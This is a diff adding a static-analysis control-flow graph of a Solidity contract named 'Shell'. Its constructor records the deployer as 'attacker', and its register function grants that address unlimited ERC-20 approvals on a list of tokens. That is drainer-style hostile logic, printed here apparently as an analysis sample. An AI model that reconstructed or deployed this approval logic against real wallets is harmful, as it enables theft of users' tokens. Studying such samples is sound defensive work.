@@ -1,0 +1,88 @@
+Contract: IERC20
+==================================================
+
+
+Contract: Shell
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: attacker = msg.sender
+
+Edges:
+  0 -> 1
+
+Function: register
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < tokens.length
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: (success,None) = tokens[i].call(abi.encodeWithSignature(approve(address,uint256),attacker,type()(uint256).max))
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: success
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: TokenApproved(tokens[i],msg.sender,type()(uint256).max)
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 11
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 3
+  1 -> 4
+  2 -> 11
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  7 -> 9
+  8 -> 9
+  9 -> 10
+  10 -> 4
+
+
